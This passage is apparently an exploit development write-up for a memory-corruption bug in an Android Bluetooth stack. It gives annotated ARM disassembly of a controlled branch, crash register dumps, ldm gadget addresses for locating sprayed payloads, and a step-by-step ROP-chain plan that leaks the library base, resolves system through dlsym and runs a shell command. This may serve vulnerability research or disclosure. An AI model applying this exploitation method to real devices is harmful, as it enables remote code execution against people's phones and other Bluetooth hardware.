.text:0x001298A4                 MOV             R4, R0                                       => Move R4 to R0                        => Set R4 = R0 = list_t* p_lcb->link_xmit_data_q
.text:0x001298A6                 LDR             R0, =(stack_canary_1A2718 - 0x1298B0)
.text:0x001298A8                 MOV             R5, R1                                       => Move R1 to R5                        => Set R5 = R1 = BT_HDR* p_buf
.text:0x001298AA                 CMP             R4, #0                                       => Test R4 = 0                          => Test if list_t* p_lcb->link_xmit_data_q is null
.text:0x001298AC                 ADD             R0, PC ; stack_canary_1A2718
.text:0x001298AE                 LDR             R0, [R0]                                     => 
.text:0x001298B0                 LDR             R0, [R0]                                     => 
.text:0x001298B2                 STR             R0, [SP,#0x148+stack_canary]                 => 
.text:0x001298B4                 BNE             loc_1298CA                                   => Test CMP                             => Jump if list_t* p_lcb->link_xmit_data_q is not null
.text:0x001298CA loc_1298CA                                                                   => 
.text:0x001298CA                 CBNZ            R5, loc_1298E0                               => Jump if R5 is not null               => Jump if BT_HDR* p_buf is null
.text:0x001298E0 loc_1298E0                                                                   => 
.text:0x001298E0                 LDR             R0, [R4,#0x10]                               => Load R0 from R4+0x10                 => Set R0 = list->allocator
.text:0x001298E2                 LDR             R1, [R0]                                     => Load R1 from R0                      => Set R1 = list->allocator->alloc
.text:0x001298E4                 MOVS            R0, #8                                       => Move 8 to R0                         => Set R0 = sizeof(list_node_t)
.text:0x001298E6                 BLX             R1                                           => Branch with link and exchange to R1  => Branch to controlled R1 !!!

Before the controlled branch to R1 registers contains:
- R0 = 0x8
- R1 = second payload value + 0x0
- R2 and R5 point to BT_HDR* p_buff with the second payload
- R4 point to list_t* p_lcb->link_xmit_data_q with the first payload


In order to find the start of the first payload in list_t* p_lcb->link_xmit_data_q pointed by R4 we used the ldm gadget found at 0x00125734:

0x00125734 : ldm r4, {r0, r1, r2, r3, r5, r6, r7, sb, sl, ip, sp, lr, pc}

The target crash with following register containts:

- R4       = ade05278 = list_t* p_lcb->link_xmit_data_q with the first payload at + 0x894C (0x894C / 0x360 = 0x28 = 40 packets where we can access the second payload)

- R0       = R4 + 0x0  = 0020de08
- R1       = R4 + 0x4  = dead0000 = first payload value + 0x0
- R2       = R4 + 0x8  = dead0001 = first payload value + 0x4
- R3       = R4 + 0xC  = dead0002 = first payload value + 0x8
- R5       = R4 + 0x10 = ade0db14 = first payload value + 0xC = address of second payload + 0x0
- R6       = R4 + 0x14 = dead0003 = first payload value + 0x10
- R7       = R4 + 0x18 = 00200004
- R9  (SB) = R4 + 0x1C = dead0000 = first payload value + 0x0
- R10 (SL) = R4 + 0x20 = dead0001 = first payload value + 0x4
- R12 (IP) = R4 + 0x24 = dead0002 = first payload value + 0x8
- R13 (SP) = R4 + 0x2C = ade0db14 = first payload value + 0xC = address of second payload+ 0x0
- R14 (LR) = R4 + 0x30 = dead0003 = first payload value + 0x10

The first payload is repeated each 0x14 bytes which is the size of list_t structure

typedef struct list_t {
list_node_t* head;                                                | Size 0x4 | Offset 0x0  | l2cap header not usable
list_node_t* tail;                                                | Size 0x4 | Offset 0x4  | first payload value + 0x0
size_t length;                                                    | Size 0x4 | Offset 0x8  | first payload value + 0x4
list_free_cb free_cb;                                             | Size 0x4 | Offset 0xC  | first payload value + 0x8
const allocator_t* allocator;                                     | Size 0x4 | Offset 0x10 | first payload value + 0xC
} list_t;                                                           | Size 0x14


In order to find the start of the second payload in BT_HDR* p_buff pointed by R5 we used the ldm gadget found at 0x000dcecc:

0x000dcecc : ldm r5, {r2, r3, r4, r6, r7, r8, lr, pc}

The target crash with following register containts:

- R2 = R5 + 0x0  = 000e0000
- R3 = R5 + 0x4  = 00000000
- R4 = R5 + 0x8  = 000a2002
- R5 = 95270300 = BT_HDR* p_buff with the second payload at + 0x???
- R6 = R5 + 0xC = 00010006
- R7 = R5 + 0x10 = 0002020a
- R8 = R5 + 0x14 = 00000002

There is no increment in this load multiple and we can see that the containt of BT_HDR* p_buff + 0x0 is:
000e0000 00000000 000a2002 00010006 0002020a 00000002

The same test with a load multiple with increment before gadget found at 0x0014b580:
0x0014b580 : ldmib r5, {r1, r2, r3, r4, r7, r8, sl, fp, sp, pc} ^

The target crash with following log:

After the crash the registers contains:
- R1 = R5 + 0x4  = 00000000
- R2 = R5 + 0x8  = 000a2002
- R3 = R5 + 0xC  = 00010006
- R4 = R5 + 0x10 = 0002020a
- R5 = 9530ee00 = BT_HDR* p_buff with the second payload at + 0x14
- R7 = R5 + 0x14  = 96300002
- R8 = R5 + 0x18  = dead0007
- SL = R5 + 0x1C  = dead0008
- FP = R5 + 0x20  = dead0009
- SP = R5 + 0x24  = dead000a

The containt of BT_HDR* p_buff + 0x4 for the increment is:
00000000 000a2002 00010006 0002020a 96300002 dead0007 dead0008 dead0009 dead000a

We can see that the second payload is at + 0x14 in BT_HDR* p_buff


########################################################################################

WRITE THE ROP CHAIN

########################################################################################

As Jan Ruge with the libicuuc library we only have access to dlsym in the bluetooth one to find the address of system in order to start the shell

The exploit process is as follow:

- Get a link transmit data buffer queue entry address at mem_offset 180 and compute base of a packet with - 176
- Get BleAdvertisingManagerImpl::SetDataAdvDataSender function address at mem_offset 28 to compute the bluetooth library base address
- Build a first payload of 32 characters containing the link transmit data buffer queue entry address
- Build a second payload of 184 characters containing then ROP chain and the shell command
- Spray the second payload at mem_offset 184 using leak method to place it in the link transmit data buffer queue
- Overflow the first payload to overwrite entries in the link transmit data buffer queue and trigger the branch to the beginning of the second payload
- Second payload start the shell command

See code for explainations

########################################################################################